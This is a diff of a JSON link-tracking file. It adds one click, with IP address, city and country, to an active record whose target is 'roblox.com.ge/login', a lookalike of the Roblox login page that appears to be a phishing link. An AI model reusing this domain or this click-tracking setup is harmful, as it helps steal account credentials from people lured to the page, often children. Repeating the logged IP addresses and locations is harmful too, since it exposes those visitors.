@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1693,
+    "useCount": 1694,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13712,6 +13712,14 @@
         "city": "Buk-gu",
         "flag": "🇰🇷",
         "countryCode": "KR"
+      },
+      {
+        "timestamp": 1777655364388,
+        "ip": "38.191.217.11",
+        "country": "Colombia",
+        "city": "San Vicente de Chucurí",
+        "flag": "🇨🇴",
+        "countryCode": "CO"
       }
     ]
   },
